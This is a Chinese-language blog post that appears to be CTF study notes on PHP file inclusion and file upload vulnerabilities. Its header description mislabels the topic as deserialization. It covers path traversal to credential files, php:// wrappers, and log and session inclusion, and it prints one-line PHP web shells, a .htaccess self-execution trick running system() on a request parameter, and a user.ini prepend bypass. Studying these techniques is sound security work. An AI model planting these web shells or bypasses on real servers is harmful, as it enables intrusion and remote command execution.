---
title: "文件包含和文件上传漏洞总结"
description: "PHP 反序列化漏洞总结，梳理魔术方法、POP 链构造和常见利用条件。"
pubDate: "2025-12-07"
updatedDate: "2025-12-07"
tags: ["PHP", "反序列化", "Web安全"]
cover: auto
coverAlt: "文件包含和文件上传漏洞总结 的文章封面"
draft: false
---
# 文件包含&文件上传漏洞总结

## 文件包含(php)

### 文件包含是什么

php语言不同于C语言的库的使用和python的import，是通过文件包含函数来把被包含文件当成php文件调用（即使文件不是php）

### 常见的文件包含函数有哪些

PHP的文件包含函数有以下四个：

- include():

  包含指定路径的文件，如果报错只会警告，不会退出

- include_once():

  跟include相似，但是如果包含已经包含过的文件，那就什么也不做

- require()：

  包含指定路径的文件，如果报错就会直接退出

- require_once():

  跟require相似，但是如果包含已经包含过的文件，那就什么也不做

PHP文件有一个特点，被<?php ?>包裹的部分会被解析成PHP代码，没有被包裹的部分会被全部**原样输出**，所以如果你包含到其他文件就能直接看到该文件的内容

如果有如下的一个漏洞代码

```
<?php 
    include '1.txt';
?>
```

而1.txt的内容如下

```
123456
<?php echo 'hello'; ?>
  include 'world'
```

执行结果将为

```
123456 hello include 'world'
```

### 常见的存在文件包含漏洞的情况

比如直接给了你一个php代码，其中存在include你的传参，或者是给你你一个web应用，拥有查询文件的功能

### 路径穿越

类似于这种试题，我们一般回去尝试读取高位敏感文件，如/etc/passwd，/proc/self/environ等

但是一般情况是我们被限定在html目录下，所以这种情况我们就可以尝试路径穿越

../一般用于返回上一目录，如果我们在/var/www/html下，我们可以通过../../../etc/passwd去访问到/etc/passwd

一般路径穿越也会存在限制

我们一般有如下绕过方法，如url编码

如果在半酣过程中出现了指定后缀，指定目录之类的过滤，指定目录可以通过../路径遍历绕过，如过强制添加后缀，可以使用以下方法

```
问号绕过

比如file传http://yourhost/1.php?1，就会把后缀识别为GET参数

井号绕过

#会截断拓展名,但是需要url编码,#的url编码是%23,比如http://yourhost/1.php%23

data伪协议
```

### 伪协议

常用的有file:// 用于读取本地文件，需要加绝对目录，php://filter 这个伪协议适用于后端为php的情况，这是一个流封装器可以将读取道德内容以你想要的形式输出，防止包含php文件时直接执行，除此之外还有php://input和zip://等，一般用到的时候去学一下也来的及

### 文件包含的一些其他形式

Session包含，日志文件包含，以及远程文件包含，session包含利用session可以修改来执行我们想要的内容，或者是去包含session的存储地址，一般为/var/lib/php5/sess_udu8pr09fjvabtoip8icgurt85   sess_后面那一串为我们抓包抓到的PHPSESSID

日志文件包含一般通过包含，我们可以先看一下日志文件中有什么内容时我们可以操控的，然后去进行利用

```
nginx：
/var/log/nginx/error.log
apache：
/var/log/apache2/access.log
```

远程文件包含，需要两个配置allow_url_include，allow_url_fopen都为On

我们可以通过远程包含自己服务器下的文件实现危险操作

## 文件上传

### 一句话木马

```
<?php @eval($_POST[1]); ?>
<?php fputs(fopen('hack.php','w'),'<?php @eval($_POST[1])?>'); ?>
```

利用一句话木马我们可以通过一些工具来获取服务器中的信息

文件上传一般都是上传图片类文件，因为类似于.php之类的可执行和文件都会过滤

### waf

常见的waf有，js层面的限制后缀，后端层面的限制后缀，配置上设置了一些文件后缀不能被正确识别成php，匹配上传文件中的内容，匹配文件的mime，匹配文件和mime是否相符

一般常见的绕过有更改mime的格式，在图片马中加入正确的mime形式，将后缀改成可以被当成php的文件，但没有被过滤，apache上传.htaccess文件，nginx的usr.ini

```
.htaccess

<Files .htaccess>
    SetHandler application/x-httpd-php 
    Require all granted
</Files>

#<?php system($_REQUEST["cmd"]);
自解析或者也可以将匹配的文件换成其他文件上传两次
```

```
GIF89a;
auto_preprnd_file=a.jpg
将a.jpg中的内容加到目录下的php文件的最前面，需要要求存在php文件
```


